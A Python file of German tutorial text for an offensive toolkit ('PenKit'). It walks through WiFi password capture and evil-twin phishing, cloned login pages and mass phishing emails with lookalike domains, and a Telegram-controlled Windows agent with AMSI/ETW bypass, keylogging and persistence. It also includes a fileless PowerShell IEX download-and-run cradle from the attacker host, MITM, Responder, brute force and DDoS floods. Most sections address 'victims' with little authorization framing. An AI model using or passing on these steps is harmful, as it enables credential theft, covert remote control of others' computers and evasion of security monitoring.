"""
PenKit Tutorials — interaktive Schritt-für-Schritt Anleitungen für alle Module.
In-Terminal, kein Browser, kein PDF.
"""

from __future__ import annotations

# ── Tutorial-Datenbank ────────────────────────────────────────────────────────

TUTORIALS: dict[str, dict] = {

    "wifi": {
        "title": "📡  WLAN-ANGRIFFE — Vollständiges Tutorial",
        "ascii": r"""
    ██╗    ██╗██╗███████╗██╗
    ██║    ██║██║██╔════╝██║
    ██║ █╗ ██║██║█████╗  ██║
    ██║███╗██║██║██╔══╝  ██║
    ╚███╔███╔╝██║██║     ██║
     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝""",
        "sections": [
            {
                "title": "🔧 VORBEREITUNG",
                "content": [
                    "Hardware: ALFA AWUS036ACH (dein Adapter) — Monitor-Mode fähig ✓",
                    "Adapter verbinden: VirtualBox → Geräte → USB → ALFA auswählen",
                    "",
                    "Monitor-Mode aktivieren (macht PenKit automatisch):",
                    "  sudo airmon-ng check kill   ← beendet störende Prozesse",
                    "  sudo airmon-ng start wlan1  ← wlan1 = dein ALFA Adapter",
                    "  → Adapter heißt jetzt wlan1mon",
                ],
            },
            {
                "title": "🎯 METHODE 1: PMKID ATTACK (empfohlen — kein Client nötig)",
                "content": [
                    "Was ist PMKID?",
                    "  Jeder WPA2-Router sendet einen PMKID-Wert der den Pre-Shared-Key enthält.",
                    "  Wir fangen diesen Wert und cracken ihn offline.",
                    "  VORTEIL: Kein Client muss im Netz sein → funktioniert immer.",
                    "",
                    "Schritte in PenKit:",
                    "  1. WiFi → Option 1 (Scanner) → Netzwerke anzeigen",
                    "  2. Ziel-BSSID (MAC des Routers) notieren, z.B. AA:BB:CC:DD:EE:FF",
                    "  3. WiFi → Option 3 (PMKID) → BSSID + Interface eingeben",
                    "  4. Warten bis PMKID gefangen → Datei wird gespeichert",
                    "  5. Passwörter → Option 2 (Hashcat) → .hc22000 Datei laden",
                    "  6. Wordlist: /usr/share/wordlists/rockyou.txt",
                    "  7. Warten → bei schwachem Passwort in Sekunden bis Stunden",
                ],
            },
            {
                "title": "🎯 METHODE 2: HANDSHAKE CAPTURE",
                "content": [
                    "Was ist ein Handshake?",
                    "  Wenn ein Gerät sich mit dem WLAN verbindet, gibt es einen '4-Way-Handshake'.",
                    "  Wir fangen diesen mit und cracken ihn offline.",
                    "  NACHTEIL: Ein Client muss sich verbinden (oder wir schicken ihn weg mit Deauth).",
                    "",
                    "Schritte:",
                    "  1. WiFi → Option 1 → Ziel-SSID + BSSID + Channel notieren",
                    "  2. WiFi → Option 2 (Handshake) → BSSID + Channel eingeben",
                    "  3. PenKit lauscht auf Handshakes...",
                    "  4. Optional: WiFi → Option 4 (Deauth) → schickt Client weg",
                    "     → Client verbindet sich neu → Handshake gefangen!",
                    "  5. Passwörter → Hashcat → .cap Datei + rockyou.txt",
                ],
            },
            {
                "title": "🎯 METHODE 3: EVIL TWIN (ohne Passwort knacken)",
                "content": [
                    "Was ist Evil Twin?",
                    "  Wir erstellen ein fake WLAN mit gleichem Namen (SSID).",
                    "  Opfer verbindet sich, wir zeigen 'Passwort falsch' → Opfer tippt Passwort",
                    "  → Wir fangen das Passwort im Klartext!",
                    "",
                    "  Funktioniert auch wenn Passwort sehr stark ist.",
                    "",
                    "Schritte:",
                    "  WiFi → Option 5 (Evil Twin) → SSID + BSSID eingeben",
                    "  PenKit erstellt Fake-AP + Captive Portal",
                    "  Opfer sieht gleiches Netzwerk → verbindet sich → gibt Passwort ein",
                    "  Passwort erscheint sofort in PenKit",
                ],
            },
            {
                "title": "💡 TIPPS & HÄUFIGE FEHLER",
                "content": [
                    "✓  Adapter im Monitor-Mode? → iwconfig | grep Monitor",
                    "✓  Richtiger Kanal? Channel muss mit Ziel übereinstimmen",
                    "✓  rockyou.txt entpacken: gunzip /usr/share/wordlists/rockyou.txt.gz",
                    "✗  'ALFA nicht erkannt': VirtualBox USB-Filter prüfen",
                    "✗  'Monitor-Mode fehlgeschlagen': airmon-ng check kill nochmal ausführen",
                    "✗  'Kein Handshake': Deauth-Flood nutzen (Option 4) + sofort lauschen",
                ],
            },
        ],
    },

    "phishing": {
        "title": "🎣  PHISHING — Vollständiges Tutorial",
        "ascii": r"""
    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
    ██╔══██╗██║  ██║██║██╔════╝██║  ██║
    ██████╔╝███████║██║███████╗███████║
    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║
    ██║     ██║  ██║██║███████║██║  ██║
    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝""",
        "sections": [
            {
                "title": "📖 WAS IST PHISHING?",
                "content": [
                    "Phishing = gefälschte Login-Seite, die wie eine echte Seite aussieht.",
                    "Opfer gibt Passwort ein → wir fangen es ab.",
                    "",
                    "PenKit hat: Google, Microsoft, Instagram, Apple, Bank",
                    "Alle Seiten sehen pixel-genau wie das Original aus.",
                ],
            },
            {
                "title": "🚀 SCHNELLSTART: PHISHING IN 5 MINUTEN",
                "content": [
                    "1. Kali IP herausfinden: ip a | grep 192",
                    "   Beispiel: 192.168.1.10",
                    "",
                    "2. PenKit → 7 (Phishing) → 1 (Server starten)",
                    "   Seite: google  |  Port: 8080",
                    "",
                    "3. Phishing-Link:",
                    "   http://192.168.1.10:8080/?page=google",
                    "",
                    "4. Link an Opfer schicken (WhatsApp, Email, QR-Code)",
                    "",
                    "5. Wenn Opfer Login-Daten eingibt:",
                    "   → Sofort in PenKit sichtbar + gespeichert unter /tmp/penkit_phish_creds.json",
                ],
            },
            {
                "title": "📧 EMAIL-PHISHING KAMPAGNE",
                "content": [
                    "Vorbereitung:",
                    "  Gmail App-Passwort erstellen:",
                    "    Google-Konto → Sicherheit → 2FA aktivieren → App-Passwörter → Neues Passwort",
                    "  Zielliste erstellen (targets.txt):",
                    "    opfer1@gmail.com",
                    "    opfer2@outlook.com",
                    "",
                    "In PenKit:",
                    "  Phishing → Option 2 → gmail Preset wählen",
                    "  Gmail-Adresse + App-Passwort eingeben",
                    "  Zielliste + Template (google_security) + Phishing-URL",
                    "  Verzögerung: 3s (wirkt natürlicher, weniger Spam-Filter)",
                    "",
                    "Beste Templates:",
                    "  google_security  → Sicherheitswarnung, sehr überzeugend",
                    "  it_department   → 'Passwort läuft ab', gut für Firmen",
                    "  bank_suspicious → Verdächtige Transaktion, hohe Klickrate",
                ],
            },
            {
                "title": "🔗 LINK GLAUBWÜRDIGER MACHEN",
                "content": [
                    "Problem: http://192.168.1.10:8080 sieht verdächtig aus",
                    "",
                    "Lösung 1 — URL-Shortener:",
                    "  bit.ly, t.ly, tinyurl.com → kurze URL",
                    "  z.B. https://bit.ly/3xAbCd → leitet auf Phishing weiter",
                    "",
                    "Lösung 2 — Eigene Domain:",
                    "  .com Domain kaufen (~10€/Jahr) die wie Original aussieht",
                    "  google-sicherheit.com, microsoft-login.net",
                    "  + Let's Encrypt HTTPS → Schloss-Symbol im Browser",
                    "",
                    "Lösung 3 — Homograph Attack:",
                    "  Unicode-Zeichen die wie lateinische Buchstaben aussehen",
                    "  goog|e.com (mit L statt l) → kaum erkennbar",
                ],
            },
        ],
    },

    "c2": {
        "title": "💀  C2 / RAT — Vollständiges Tutorial",
        "ascii": r"""
     ██████╗██████╗
    ██╔════╝╚════██╗
    ██║      █████╔╝
    ██║     ██╔═══╝
    ╚██████╗███████╗
     ╚═════╝╚══════╝""",
        "sections": [
            {
                "title": "📖 ÜBERBLICK: WIE C2 FUNKTIONIERT",
                "content": [
                    "C2 = Command & Control",
                    "",
                    "Ablauf:",
                    "  Kali (du)  ←→  Telegram  ←→  Windows-Ziel",
                    "",
                    "  1. PenKit generiert einen PS1-Agent für Windows",
                    "  2. Agent wird auf Ziel-PC gebracht (verschiedene Wege)",
                    "  3. Agent startet + verbindet sich mit Telegram-Bot",
                    "  4. Du schickst Befehle via Telegram → Agent führt aus → Ergebnis zurück",
                    "",
                    "  Kein offener Port nötig!",
                    "  Agent pollt Telegram alle 10s → funktioniert hinter NAT/Firewall",
                ],
            },
            {
                "title": "🤖 SCHRITT 1: TELEGRAM BOT EINRICHTEN",
                "content": [
                    "1. Telegram öffnen → @BotFather suchen → anschreiben",
                    "2. /newbot → Name eingeben (z.B. 'Helper') → Username (z.B. 'helper_xyz_bot')",
                    "3. BotFather gibt Token: 1234567890:ABCdef...",
                    "   → Token kopieren + sicher aufbewahren!",
                    "",
                    "4. In PenKit: C2 → Option 8 (Bot Setup)",
                    "   → Token eingeben",
                    "   → PenKit testet Token automatisch",
                    "   → Dem Bot eine Nachricht schicken → Chat-ID wird automatisch erkannt",
                    "",
                    "5. Config wird gespeichert → nächstes Mal automatisch geladen",
                ],
            },
            {
                "title": "🔨 SCHRITT 2: AGENT GENERIEREN",
                "content": [
                    "In PenKit: C2 → Option 7 (Telegram Agent)",
                    "  → Token + Chat-ID (aus Schritt 1)",
                    "  → Interval: 10s (empfohlen)",
                    "  → Agent wird gespeichert: /tmp/penkit_agent_<id>.ps1",
                    "",
                    "Was der Agent enthält:",
                    "  ✓ AMSI Bypass (Defender sieht ihn nicht)",
                    "  ✓ ETW Bypass (keine Windows-Logs)",
                    "  ✓ Screenshot-Funktion",
                    "  ✓ Keylogger",
                    "  ✓ Alle 14 Telegram-Befehle",
                ],
            },
            {
                "title": "📦 SCHRITT 3: PAYLOAD AUF ZIEL BRINGEN",
                "content": [
                    "Methode A — Full Package (empfohlen für Anfänger):",
                    "  C2 → Option 1 → LHOST/LPORT eingeben",
                    "  → Erstellt: HTA, BAT, VBA Macro, fileless Stager + ANLEITUNG.txt",
                    "  → ANLEITUNG.txt lesen!",
                    "",
                    "Methode B — Als PDF tarnen:",
                    "  C2 → Option 6 → PS1-Pfad + Typ 'pdf'",
                    "  → EXE mit PDF-Icon, öffnet echte Decoy-PDF",
                    "",
                    "Methode C — Fileless (nichts auf Disk):",
                    "  Python HTTP-Server: python3 -m http.server 8080 --directory /tmp",
                    "  Auf Ziel in PowerShell:",
                    "  IEX(New-Object Net.WebClient).DownloadString('http://<KALI>:8080/agent.ps1')",
                ],
            },
            {
                "title": "📱 SCHRITT 4: ZIEL STEUERN VIA TELEGRAM",
                "content": [
                    "Wenn Agent läuft → Telegram-Bot sendet 'Agent online'",
                    "",
                    "Wichtigste Befehle:",
                    "  !help          → alle Befehle anzeigen",
                    "  !sysinfo       → OS, User, IP, Standort, AV",
                    "  !screenshot    → Screenshot als Foto in Telegram",
                    "  !shell whoami  → beliebiger CMD-Befehl",
                    "  !wifi          → alle gespeicherten WLAN-Passwörter",
                    "  !keylog start  → Keylogger starten",
                    "  !keylog dump   → bisher getippten Text senden",
                    "  !download C:\\Users\\user\\Desktop\\file.txt  → Datei in Telegram",
                    "  !persist       → Agent überlebt Neustart (Scheduled Task)",
                    "  !ls C:\\Users   → Verzeichnis auflisten",
                ],
            },
        ],
    },

    "mitm": {
        "title": "☠️  MITM — Vollständiges Tutorial",
        "ascii": r"""
    ███╗   ███╗██╗████████╗███╗   ███╗
    ████╗ ████║██║╚══██╔══╝████╗ ████║
    ██╔████╔██║██║   ██║   ██╔████╔██║
    ██║╚██╔╝██║██║   ██║   ██║╚██╔╝██║
    ██║ ╚═╝ ██║██║   ██║   ██║ ╚═╝ ██║
    ╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝     ╚═╝""",
        "sections": [
            {
                "title": "📖 WAS IST MITM?",
                "content": [
                    "Man-in-the-Middle = Kali positioniert sich zwischen Ziel und Router.",
                    "Gesamter Netzwerkverkehr des Ziels läuft durch Kali.",
                    "",
                    "Was wir sehen können:",
                    "  ✓ HTTP-Seiten im Klartext (URLs, Formulare, Passwörter)",
                    "  ✓ HTTPS mit SSL-Strip (teilweise)",
                    "  ✓ NTLMv2-Hashes in Windows-Netzen (Responder)",
                    "  ✓ DNS-Anfragen → zu fake Seiten umleiten",
                    "  ✓ Alle Cookies + Session-Tokens",
                ],
            },
            {
                "title": "🚀 BETTERCAP ARP-SPOOFING",
                "content": [
                    "Voraussetzung: Kali + Ziel im selben Netzwerk",
                    "",
                    "Was passiert beim ARP-Spoofing:",
                    "  Normal:  Ziel → Router → Internet",
                    "  Mit ARP: Ziel → Kali → Router → Internet",
                    "  Kali sieht alles!",
                    "",
                    "In PenKit:",
                    "  MITM → Option 1 (bettercap)",
                    "  Ziel-IP eingeben: 192.168.1.50",
                    "  Gateway: 192.168.1.1 (dein Router, meist .1)",
                    "  → Kali leitet Traffic weiter (ip_forward aktiv)",
                    "  → bettercap zeigt HTTP-Traffic live",
                ],
            },
            {
                "title": "🔑 RESPONDER (Windows-Netzwerke)",
                "content": [
                    "Responder fängt NTLMv2-Hashes in Windows-Netzen.",
                    "",
                    "Wann funktioniert es:",
                    "  Windows-PC tippt \\\\server\\share → fragt im Netz nach",
                    "  Responder antwortet: 'Ich bin der Server!'",
                    "  Windows sendet NTLMv2-Hash zur Authentifizierung",
                    "  Hash cracken → Windows-Passwort im Klartext",
                    "",
                    "In PenKit:",
                    "  MITM → Option 2 (Responder) → Interface wählen",
                    "  Hashes erscheinen automatisch",
                    "  → Passwörter → Hashcat → NTLM-Hash cracken",
                    "",
                    "Tipp: Am effektivsten in Firmennetzwerken (viele Windows-PCs)",
                ],
            },
        ],
    },

    "osint": {
        "title": "🔍  OSINT — Vollständiges Tutorial",
        "ascii": r"""
     ██████╗ ███████╗██╗███╗  ██╗████████╗
    ██╔═══██╗██╔════╝██║████╗ ██║╚══██╔══╝
    ██║   ██║███████╗██║██╔██╗██║   ██║
    ██║   ██║╚════██║██║██║╚████║   ██║
    ╚██████╔╝███████║██║██║ ╚███║   ██║
     ╚═════╝ ╚══════╝╚═╝╚═╝  ╚══╝   ╚═╝""",
        "sections": [
            {
                "title": "📖 WAS IST OSINT?",
                "content": [
                    "Open Source Intelligence = öffentlich zugängliche Informationen sammeln.",
                    "Keine Hacking-Techniken — alles legal aus öffentlichen Quellen.",
                    "",
                    "Was wir finden können:",
                    "  ✓ Email-Adressen von Mitarbeitern",
                    "  ✓ Subdomains (admin.example.com, dev.example.com)",
                    "  ✓ IP-Adressen + Hosting-Provider",
                    "  ✓ Social-Media-Profile eines Usernames (300+ Plattformen)",
                    "  ✓ Datenlecks (HaveIBeenPwned)",
                    "  ✓ Versteckte Dokumente via Google Dorks",
                ],
            },
            {
                "title": "🎯 DOMAIN RECONNAISSANCE",
                "content": [
                    "OSINT → Domain eingeben (z.B. targetcompany.com)",
                    "",
                    "Pipeline läuft automatisch:",
                    "  1. theHarvester → Emails + Subdomains + IPs aus 8 Quellen",
                    "  2. Sublist3r → weitere Subdomains",
                    "  3. crt.sh → Certificate Transparency (findet versteckte Subdomains)",
                    "  4. Auto-Report → alles in Markdown-Datei",
                    "",
                    "Interessante Funde:",
                    "  dev.company.com  → Entwicklungsserver (oft ungeschützt)",
                    "  admin.company.com → Admin-Panel",
                    "  vpn.company.com  → VPN-Zugang",
                    "  mail@company.com → Spear-Phishing-Ziel",
                ],
            },
            {
                "title": "👤 PERSON / USERNAME RECHERCHE",
                "content": [
                    "OSINT → Username eingeben (z.B. 'max_muster')",
                    "",
                    "Sherlock prüft 300+ Plattformen:",
                    "  Instagram, TikTok, Twitter, GitHub, Reddit, Steam...",
                    "  → Gibt URLs zu allen gefundenen Profilen",
                    "",
                    "Tipps:",
                    "  Gleicher Username auf mehreren Plattformen = gleiche Person",
                    "  GitHub-Profil → echte Email, Name, Arbeitgeber oft sichtbar",
                    "  LinkedIn → Jobtitel, Firma, Kollegen",
                    "  Kombination: Email aus Harvest → Username → Profil → Spear-Phishing",
                ],
            },
            {
                "title": "🔎 GOOGLE DORKS",
                "content": [
                    "Google Dorks = spezielle Suchanfragen die versteckte Infos finden.",
                    "",
                    "Wichtigste Dorks (automatisch in PenKit generiert):",
                    "  site:example.com filetype:pdf        → PDF-Dokumente",
                    "  site:example.com inurl:admin          → Admin-Panels",
                    "  site:example.com ext:sql              → SQL-Backups (Goldgrube!)",
                    "  \"@example.com\" filetype:xls           → Excel mit Email-Adressen",
                    "  site:pastebin.com \"example.com\"        → Datenlecks auf Pastebin",
                    "  site:github.com \"example.com\" password → API-Keys in Repos",
                    "",
                    "In PenKit: OSINT → Google Dorks → Domain eingeben",
                    "Dorks direkt in Google / googler eingeben",
                ],
            },
        ],
    },

    "passwords": {
        "title": "🔑  PASSWÖRTER & HASHES — Tutorial",
        "ascii": r"""
    ██████╗  █████╗ ███████╗███████╗
    ██╔══██╗██╔══██╗██╔════╝██╔════╝
    ██████╔╝███████║███████╗███████╗
    ██╔═══╝ ██╔══██║╚════██║╚════██║
    ██║     ██║  ██║███████║███████║
    ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝""",
        "sections": [
            {
                "title": "🔓 HASH-TYPEN ERKENNEN",
                "content": [
                    "PenKit erkennt automatisch den Hash-Typ.",
                    "",
                    "Häufige Hashes und wo du sie findest:",
                    "  MD5    : 32 Zeichen hex → alte Websites, PHP-Apps",
                    "  SHA256 : 64 Zeichen hex → neuere Apps",
                    "  NTLM   : 32 Zeichen hex → Windows (anders als MD5!)",
                    "  bcrypt : $2b$... → sichere Passwort-Datenbanken",
                    "  WPA2   : aus .cap/.hc22000 → WLAN-Handshake",
                    "",
                    "Passwörter → Option 1 → Hash eingeben → Typ wird erkannt",
                ],
            },
            {
                "title": "⚡ HASHCAT GPU-CRACKING",
                "content": [
                    "Hashcat nutzt deine GPU → 100-10000x schneller als CPU.",
                    "",
                    "Reihenfolge (beste Effizienz):",
                    "  1. Wordlist-Attack: rockyou.txt (14 Mio Passwörter)",
                    "     → 90% aller schwachen Passwörter geknackt",
                    "",
                    "  2. Rule-Attack: rockyou + best64.rule",
                    "     → Varianten: password → P@ssw0rd, password123...",
                    "",
                    "  3. Kombinations-Attack: 2 Wordlisten kombinieren",
                    "     → musik + 2024 → musik2024",
                    "",
                    "  4. Brute-Force: ?a?a?a?a?a?a (6 Zeichen)",
                    "     → Nur wenn Passwort kurz (< 8 Zeichen)",
                    "",
                    "In VirtualBox: GPU-Zugriff oft eingeschränkt → CPU nutzen (langsamer)",
                    "Tipp: hashcat auf Windows direkt ausführen für maximale GPU-Speed",
                ],
            },
            {
                "title": "🌐 ONLINE BRUTE-FORCE MIT HYDRA",
                "content": [
                    "Hydra probiert Passwörter direkt gegen echte Services.",
                    "",
                    "Unterstützte Protokolle:",
                    "  SSH, FTP, HTTP-Form, HTTPS-Form, RDP, SMB,",
                    "  MySQL, PostgreSQL, VNC, Telnet, POP3, IMAP...",
                    "",
                    "In PenKit: Passwörter → Option 4 (Hydra)",
                    "  Ziel + Protokoll + Username + Wordlist",
                    "",
                    "WICHTIG: Vorsicht mit Rate-Limiting!",
                    "  SSH: meist 3 Fehlversuche → Lockout oder Ban",
                    "  HTTP: oft keine Rate-Limits → mehr Threads möglich",
                    "  Empfehlung: 1-3 Threads für SSH/RDP, 10-20 für HTTP",
                ],
            },
        ],
    },

    "ddos": {
        "title": "💥  DDOS / STRESS-TEST — Tutorial",
        "ascii": r"""
    ██████╗ ██████╗  ██████╗ ███████╗
    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
    ██║  ██║██║  ██║██║   ██║███████╗
    ██║  ██║██║  ██║██║   ██║╚════██║
    ██████╔╝██████╔╝╚██████╔╝███████║
    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝""",
        "sections": [
            {
                "title": "⚠️  RECHTLICHER HINWEIS",
                "content": [
                    "DDoS auf fremde Server = strafbar (§303b StGB, bis 10 Jahre Haft).",
                    "NUR verwenden für:",
                    "  ✓ Eigene Server (Stress-Test vor dem Launch)",
                    "  ✓ Schriftlich autorisierte Pentests",
                    "  ✓ Lernzwecke im eigenen Heimnetz (eigener Raspberry Pi etc.)",
                ],
            },
            {
                "title": "🐌 SLOWLORIS — WANN UND WIE",
                "content": [
                    "Slowloris ist einzigartig: braucht kaum Bandbreite aber ist sehr effektiv.",
                    "",
                    "Wie es funktioniert:",
                    "  HTTP-Server erlauben X gleichzeitige Verbindungen.",
                    "  Slowloris hält alle Verbindungen offen (schickt nie den letzten Header).",
                    "  Echter Traffic bekommt keine Verbindung mehr → Server 'down'.",
                    "",
                    "Wirkt gegen: Apache (sehr gut), ältere nginx-Configs",
                    "Wirkt NICHT gegen: nginx (default), Cloudflare, LiteSpeed",
                    "",
                    "Einstellungen:",
                    "  Sockets: 200 (Standard) — mehr = wirkungsvoller",
                    "  HTTPS-Modus für Port 443",
                    "  Dauer: 60-300s für Tests",
                ],
            },
            {
                "title": "🌊 HTTP FLOOD — MAXIMALE REQUESTS",
                "content": [
                    "Sendet so viele GET-Requests wie möglich via asyncio.",
                    "",
                    "Gut gegen: Ungeschützte Web-Apps, APIs ohne Rate-Limit",
                    "Nicht gut gegen: Cloudflare, CDN, Load-Balancer",
                    "",
                    "Workers: 100 (Standard) → 100 parallele Verbindungen",
                    "Erwarteter Output: 500-5000 req/s (je nach Server + Netz)",
                    "",
                    "Zufällige User-Agents + Cache-Buster machen Blocking schwerer.",
                ],
            },
        ],
    },

    "iot": {
        "title": "📡  IOT SCANNER — Tutorial",
        "ascii": r"""
    ██╗ ██████╗ ████████╗
    ██║██╔═══██╗╚══██╔══╝
    ██║██║   ██║   ██║
    ██║██║   ██║   ██║
    ██║╚██████╔╝   ██║
    ╚═╝ ╚═════╝    ╚═╝""",
        "sections": [
            {
                "title": "🎯 WAS FINDET DER IOT SCANNER?",
                "content": [
                    "Im typischen Heimnetz (192.168.1.0/24) findet er:",
                    "  ✓ Router (Fritz!Box, TP-Link, Netgear, Huawei...)",
                    "  ✓ IP-Kameras (Hikvision, Dahua, generic)",
                    "  ✓ NAS (Synology, QNAP)",
                    "  ✓ Smart-Home (Hue Bridge, Home Assistant)",
                    "  ✓ Raspberry Pi",
                    "  ✓ Drucker, Smart-TVs, alles mit IP",
                    "",
                    "Testet automatisch 65+ Default-Credential-Kombinationen.",
                ],
            },
            {
                "title": "🚀 SCAN DURCHFÜHREN",
                "content": [
                    "Netzwerk → Option 5 (IoT Scanner)",
                    "Ziel: 192.168.1.0/24 (dein Heimnetz)",
                    "",
                    "Scanner läuft in 3 Phasen:",
                    "  Phase 1: Nmap findet offene IoT-Ports",
                    "  Phase 2: Banner-Grab → Hersteller + Modell erkennen",
                    "  Phase 3: Default-Creds testen (HTTP Basic Auth + Form + Telnet)",
                    "",
                    "Ergebnis: Liste aller gefährdeten Geräte mit Login-Daten",
                    "",
                    "Häufigste Funde:",
                    "  Router mit admin/admin (50% aller Heimrouter!)",
                    "  IP-Kameras mit leerem Passwort",
                    "  Telnet auf Port 23 mit root/root",
                ],
            },
        ],
    },
}


def get_tutorial(name: str) -> dict | None:
    return TUTORIALS.get(name)


def list_tutorials() -> list[tuple[str, str]]:
    return [(k, v["title"]) for k, v in TUTORIALS.items()]
